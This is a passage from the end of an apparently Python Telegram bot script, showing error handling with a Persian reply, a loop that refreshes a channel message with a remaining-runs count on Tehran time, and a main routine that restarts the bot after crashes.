                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

    except Exception as e:
        logger.error(f"Error in handle_text: {e}")
        await message.reply("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")


async def channel_message_updater():
    last_minute = None
    last_run_count = REMAINING_RUNS
    while True:
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_minute = now.strftime('%H:%M')
            current_run_count = load_max_runs()

            if current_minute != last_minute or current_run_count != last_run_count:
                last_minute = current_minute
                last_run_count = current_run_count
                globals()["REMAINING_RUNS"] = current_run_count
                await update_channel_message()
        except Exception as e:
            logger.error(f"Error in channel_message_updater: {e}")
        await asyncio.sleep(1)


async def main():
    await bot.start()
    logger.info("Bot started successfully!")
    loop = asyncio.get_event_loop()
    loop.create_task(channel_message_updater())
    await idle()


if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
            break
        except Exception as e:
            logger.critical(f"Critical error: {e}")
            time.sleep(10)
